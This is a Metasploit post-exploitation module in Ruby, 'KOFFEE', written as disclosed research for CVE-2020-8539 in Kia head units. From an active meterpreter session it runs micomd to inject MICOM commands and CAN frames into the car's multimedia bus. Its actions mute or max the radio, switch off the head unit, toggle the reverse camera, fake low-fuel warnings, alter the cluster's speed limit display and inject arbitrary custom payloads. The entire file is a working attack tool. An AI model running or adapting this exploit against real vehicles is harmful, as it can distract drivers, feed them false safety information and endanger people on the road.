# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'KOFFEE - Kia OFFensivE Exploit',
        'Description' => %q{
          This module exploits CVE-2020-8539, which is an arbitrary code execution vulnerability that allows an to
          attacker execute the micomd binary file on the head unit of Kia Motors. This module has been tested on
          SOP.003.30.18.0703, SOP.005.7.181019 and SOP.007.1.191209 head unit software versions. This module, run on an
          active session, allows an attacker to send crafted micomd commands that allow the attacker to control the head
          unit and send CAN bus frames into the Multimedia CAN (M-Can) of the vehicle.
        },
        'SessionTypes' => ['meterpreter'],
        'Author' => [
          'Gianpiero Costantino',
          'Ilaria Matteucci'
        ],
        'References' => [
          ['CVE', '2020-8539'],
          ['URL', 'https://sowhat.iit.cnr.it/pdf/IIT-20-2020.pdf']
        ],
        'Actions' => [
          [ 'TOGGLE_RADIO_MUTE', { 'Description' => 'It mutes/umutes the radio' } ],
          [ 'REDUCE_RADIO_VOLUME', { 'Description' => 'It decreases the radio volume' } ],
          [ 'MAX_RADIO_VOLUME', { 'Description' => 'It sets the radio volume to the max' } ],
          [ 'LOW_SCREEN_BRIGHTNESS', { 'Description' => 'It decreases the head unit screen brightness' } ],
          [ 'HIGH_SCREEN_BRIGHTNESS', { 'Description' => 'It increases the head unit screen brightness' } ],
          [ 'LOW_FUEL_WARNING', { 'Description' => 'It pops up a low fuel message on the head unit' } ],
          [ 'NAVIGATION_FULL_SCREEN', { 'Description' => 'It pops up the navigation app window' } ],
          [ 'SET_NAVIGATION_ADDRESS', { 'Description' => 'It pops up the navigation address window' } ],
          [ 'SEEK_DOWN_SEARCH', { 'Description' => 'It triggers the seek down radio frequency search' } ],
          [ 'SEEK_UP_SEARCH', { 'Description' => 'It triggers the seek up radio frequency search' } ],
          [ 'SWITCH_ON_HU', { 'Description' => 'It switches on the head unit' } ],
          [ 'SWITCH_OFF_HU', { 'Description' => 'It switches off the head unit' } ],
          [ 'CAMERA_REVERSE_ON', { 'Description' => 'It shows the parking camera video stream' } ],
          [ 'CAMERA_REVERSE_OFF', { 'Description' => 'It hides the parking camera video stream' } ],
          [ 'CLUSTER_CHANGE_LANGUAGE', { 'Description' => 'It changes the cluster language' } ],
          [ 'CLUSTER_SPEED_LIMIT', { 'Description' => 'It changes the speed limit shown in the instrument cluster' } ],
          [ 'CLUSTER_ROUNDABOUT_FARAWAY', { 'Description' => 'It shows a round about signal with variable distance in the instrument cluster ' } ],
          [ 'CLUSTER_RANDOM_NAVIGATION', { 'Description' => 'It shows navigation signals in the instrument cluster ' } ],
          [ 'CLUSTER_RADIO_INFO', { 'Description' => 'It shows radio info in the instrument cluster ' } ],
          [ 'INJECT_CUSTOM', { 'Description' => 'It injects custom micom payloads' } ]
        ],
        'DefaultAction' => 'TOGGLE_RADIO_MUTE',
        'Platform' => 'Android',
        'DisclosureDate' => '2020-12-02',
        'License' => MSF_LICENSE
      )
    )
    register_options([
      OptString.new('MICOMD', [true, 'Path to micomd executable', '/system/bin/micomd']),
      OptString.new('PERIOD', [true, 'Time (ms) interval between two MICOM commands, aka Period of CAN frames', '0.200']),
      OptInt.new('NUM_MSG', [true, 'Number of MICOM commands sent each time', '5']),
      OptString.new('CMD_PAYLOAD', [ false, 'Micom payload to inject, e.g.,  cmd byte1 byte3 byte2', '00 00 00'], conditions: %w[ACTION == INJECT_CUSTOM]),
    ])
  end

  def send_in(m_cmd)
    cmd = "#{datastore['MICOMD']} -c inject #{m_cmd}"
    cmd_exec(cmd)
    print_good(' -- Command Sent -- ')
  end

  def send_out(m_cmd)
    cmd = "#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}"
    cmd_exec(cmd)
    print_good(' -- Command Sent -- ')
  end

  def send_custom(m_cmd)
    cmd = "#{datastore['MICOMD']} -c inject #{m_cmd}"
    var = 0
    while var < datastore['NUM_MSG'].to_s.to_i
      cmd_exec(cmd)
      var += 1
      print_status("> Sending #{var} out of #{datastore['NUM_MSG']}")
      sleep(datastore['PERIOD'].to_s.to_f)
    end
    print_good(' -- Custom payload Sent-- ')
  end

  def send_out_custom(m_cmd)
    cmd = "#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}"
    var = 0
    while var < datastore['Num_msg'].to_s.to_i
      cmd_exec(cmd)
      var += 1
      print_status("> Sending #{var} out of #{datastore['NUM_MSG']}")
      sleep(datastore['PERIOD'].to_s.to_f)
    end
    print_good(' -- CAN bus frames sent-- ')
  end

  def run
    # all conditional options are required when active, make sure none of them are blank
    options.each_pair do |name, option|
      next if option.conditions.empty?
      next unless Msf::OptCondition.show_option(self, option)

      fail_with(Failure::BadConfig, "The #{name} option is required by the #{action.name} action.") if datastore[name].blank?
    end
    print_status(' -- Starting action -- ')
    send("action_#{action.name.downcase}")
  end

  def action_toggle_radio_mute
    print_status(' -- Mute/umute radio -- ')
    send_in('8351 04')
  end

  def action_reduce_radio_volume
    print_status(' -- Reduce radio volume -- ')
    send_out('0112 F4 01')
  end

  def action_max_radio_volume
    print_status(' -- Max radio volume -- ')
    send_out('0112 F0')
  end

  def action_low_screen_brightness
    print_status(' -- Low screen brightness -- ')
    send_in('8353 07 01')
  end

  def action_high_screen_brightness
    print_status(' -- High screen brightness -- ')
    send_in('8353 07 00')
  end

  def action_low_fuel_warning
    print_status(' -- Low fuel warning -- ')
    send_in('8353 0B 01')
  end

  def action_navigation_full_screen
    print_status(' -- Navigation windows full screen -- ')
    send_in('8353 0C 01')
  end

  def action_set_navigation_address
    print_status(' -- Navigation address window pops up -- ')
    send_in('8353 0D 03')
  end

  def action_seek_down_search
    print_status(' -- Seek down radio search -- ')
    send_out('133 01')
  end

  def action_seek_up_search
    print_status(' -- Seek up radio search -- ')
    send_out('133 02')
  end

  def action_switch_on_hu
    print_status(' -- Switch on Head unit -- ')
    send_out('170 01')
  end

  def action_switch_off_hu
    print_status(' -- Switch off Head unit -- ')
    send_out('170 00')
  end

  def action_camera_reverse_on
    print_status(' -- Parking camera video stream on -- ')
    send_in('8353 03 01')
  end

  def action_camera_reverse_off
    print_status(' -- Parking camera video stream off -- ')
    send_in('8353 03 00')
  end

  def action_cluster_change_language
    print_status(' -- Korean -- ')
    send_out_custom('4D3 01')
    print_status(' -- Arabic -- ')
    send_out_custom('4D3 08')
    print_status(' -- Polish -- ')
    send_out_custom('4D3 0E')
    print_status(' -- Italian -- ')
    send_out_custom('4D3 12')
  end

  def action_cluster_speed_limit
    print_status(' -- Chaning speed limit on the instrument cluster -- ')
    send_out_custom('4DB 00 0A')
    send_out_custom('4DB 00 2A')
    send_out_custom('4DB 00 3A')
    send_out_custom('4DB 00 5A')
    send_out_custom('4DB 00 7A')
    send_out_custom('4DB 00 9A')
    send_out_custom('4DB 00 AA')
    send_out_custom('4DB 00 BA')
  end

  def action_cluster_roundabout_faraway
    print_status(' -- km -- ')
    send_out_custom('4D1 66 00 00 00 14 86 10 00')
    print_status(' -- mi -- ')
    send_out_custom('4D1 66 00 00 00 14 86 20 00')
    print_status(' -- ft -- ')
    send_out_custom('4D1 66 00 00 00 14 86 30 00')
    print_status(' -- yd -- ')
    send_out_custom('4D1 66 00 00 00 14 86 40 00')
    print_status(' -- No distance -- ')
    send_out_custom('4D1 66 00 00 00 14 86 50 00')
  end

  def action_cluster_random_navigation
    print_status(' -- Calculating the route -- ')
    send_out_custom('4D1 09')
    print_status(' -- Recalculating the route -- ')
    send_out_custom('4D1 0A')
    print_status(' -- Straight ahead -- ')
    send_out_custom('4D1 0D')
    print_status(' -- Exit on the Right -- ')
    send_out_custom('4D1 13')
    print_status(' -- Exit on the Left -- ')
    send_out_custom('4D1 14')
  end

  def action_cluster_radio_info
    print_status(' -- USB Music -- ')
    send_out_custom('4D6 65')
    print_status(' -- Android Auto -- ')
    send_out_custom('4D6 6F')
    print_status(' -- FM 168.17 -- ')
    send_out_custom('4D6 11 9D 00 00 00 00 5F 83')
    print_status(' -- FM1 168.17 -- ')
    send_out_custom('4D6 12 9D 00 00 00 00 5F 83')
    print_status(' -- FM2 168.17 -- ')
    send_out_custom('4D6 13 9D 00 00 00 00 5F 83')
  end

  def action_inject_custom
    print_status(" -- Injecting custom payload  (#{datastore['CMD_PAYLOAD']}) -- ")
    send_custom(datastore['CMD_PAYLOAD'])
  end
end
